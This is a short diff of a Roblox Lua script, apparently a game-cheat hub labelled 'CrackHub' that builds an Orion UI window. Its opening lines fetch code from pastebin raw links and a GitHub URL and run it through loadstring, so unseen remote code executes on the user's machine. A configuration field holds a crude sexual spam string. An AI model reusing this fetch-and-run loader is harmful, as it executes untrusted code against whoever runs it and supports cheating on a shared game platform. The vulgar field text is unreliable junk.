@@ -1,5 +1,6 @@
 loadstring(game:HttpGet(("https://pastebin.com/raw/g41YF3YD"),true))()
 loadstring(game:HttpGet(('https://pastebin.com/raw/PVytRktS'),true))()
+wait("10")
 local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
 local Window = OrionLib:MakeWindow({Name = "CrackHub | Orion", HidePremium = false, SaveConfig = true, ConfigFolder = "Miha having sex with Jumanji Full Porn Video Watch for Free", IntroEnabled = true, IntroText = "v1.8", Icon = 7074749})
 OrionLib:MakeNotification({
